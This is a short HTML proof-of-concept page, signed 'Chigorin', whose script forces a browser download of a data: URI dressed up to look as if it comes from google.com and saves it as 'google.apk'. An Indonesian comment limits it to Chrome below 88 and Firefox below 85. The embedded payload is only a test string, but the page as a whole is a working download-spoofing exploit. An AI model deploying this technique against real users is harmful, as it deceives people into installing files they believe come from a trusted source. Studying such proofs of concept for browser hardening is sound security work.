<!DOCTYPE html>
<html>
<body>
  <center><h2 onclick="openWin()" style="cursor:pointer;">POC by Chigorin!</h2></center>
  <script>
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    function openWin() {
      // INI HANYA JALAN DI CHROME < 88 / FIREFOX < 85
      Puf("data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=", "google.apk");
    }
  </script>
</body>
</html>
